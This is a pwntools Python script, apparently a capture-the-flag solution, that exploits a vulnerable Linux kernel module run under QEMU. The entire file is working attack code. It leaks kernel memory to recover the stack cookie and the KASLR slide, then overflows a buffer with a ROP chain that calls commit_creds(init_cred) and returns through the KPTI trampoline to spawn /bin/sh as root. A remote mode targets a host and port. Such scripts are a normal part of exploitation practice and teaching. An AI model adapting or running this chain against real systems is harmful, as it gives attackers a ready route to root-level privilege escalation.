
#!/usr/bin/python3.8
from pwn import *
from more_itertools import sliced
import os
import time

os.chdir('../setup')
elf = context.binary = ELF("wrapper")
libc = elf.libc
context.terminal = ['tilix', '-a', 'session-add-down', '-e']
gs = '''
init-pwndbg
c
'''

# wrapper functrns
def sl(x): r.sendline(x)
def sla(x, y): r.sendlineafter(x, y)
def se(x): r.send(x)
def sa(x, y): r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(':')[0]
        PORT = args.R.split(':')[1]
        return remote(HOST, PORT)
    else:
        return process(["/usr/bin/qemu-system-x86_64",
                        "-cpu", "kvm64",
                        "-m", "128M",
                        "-kernel", "linux-5.10.180/arch/x86/boot/bzImage",
                        "-initrd", "initramfs.cpio.gz",
                        "-nographic",
                        "-monitor", "/dev/null",
                        "-s", "-S",
                        "-append", "console=ttyS0 kpti loglevel=0 nokaslr",
                        "-no-reboot"])

r= run()
# =-=-=-= GADGETS / addresses -=-=-=-
OFFSET_LEAK = 0xbc1b00
KERNEL_BASE = 0xffffffff81000000
REAL_KERNEL_BASE = 0
KASLR_SLIDE = 0
COOKIE = 0
STACK_LEAK = 0
USER_CMD_ADDR = 0

INIT_CRED = 0xffffffff8264c9e0
COMMIT_CRED = 0xffffffff8108d350
KPTI_TRAMPOLINE = 0xffffffff81c00e30 + 49
K_POP_RDI = 0xffffffff810db61d


# =-==-=-=-=-=-=-=-=-=-=-=- Leak Addresses =-=-==-=-==--=-=-=-=-=-=-==--
time.sleep(2)
leak_amount = b'240'
ru(b'Choice: ')
sl(b'1')
ru(b'read: ')
sl(leak_amount)

#rl()  # comment out when running against local xinetd / qemu
rl()
leak = rl()
leak = list(sliced(leak, 8))
leak = [uu64(x) for x in leak]

for i in range(len(leak)):
    #print(f'{i // 8}: {uu64(leak[i:i+8]):#x}')
    log_addr(i, leak[i])

#     cookie = leaked[10];
#     stack_leak = leaked[13];
#     user_cmd_addr = stack_leak + 0x130;
#     kbase = leaked[0] - OFFSET_LEAK;
#     kbase_off = kbase - KERNEL_BASE;
COOKIE = leak[10]
STACK_LEAK = leak[13]
REAL_KERNEL_BASE = leak[0] - OFFSET_LEAK
KASLR_SLIDE = REAL_KERNEL_BASE - KERNEL_BASE

log_addr('Cookie', COOKIE)
log_addr('Stack leak', STACK_LEAK)
log_addr('Kernel Base', REAL_KERNEL_BASE)
log_addr('KASLR slide', KASLR_SLIDE)


# =-==-=-=-=-=-=-=-=-=-=-=- Overflow =-=-==-=-==--=-=-=-=-=-=-==--
rop = ROP(elf)


payload = [
    b'/bin/sh\x00',
    STACK_LEAK,
    0,
    rop.rsi.address,
    STACK_LEAK + 8,
    rop.rdx.address,
    0,
    rop.rax.address,
    0x3b,
    rop.syscall.address,
    0,
    0,
    0,
    0,
    0,
    0,
    COOKIE,
    0,
    K_POP_RDI + KASLR_SLIDE,
    INIT_CRED + KASLR_SLIDE,
    COMMIT_CRED + KASLR_SLIDE,
    KPTI_TRAMPOLINE + KASLR_SLIDE,
    0,
    0,
    rop.find_gadget(['pop rdi','pop rbp']).address, # RIP
    0x33,                               # cs
    0x202,                              # rflags
    STACK_LEAK + 8,                     # sp
    0x2b                                # ss
]
j = 1

ru(b'Choice: ')
sl(b'2')
ru(b"write: ")
sl(flat(payload))


# ====================================
r.interactive()

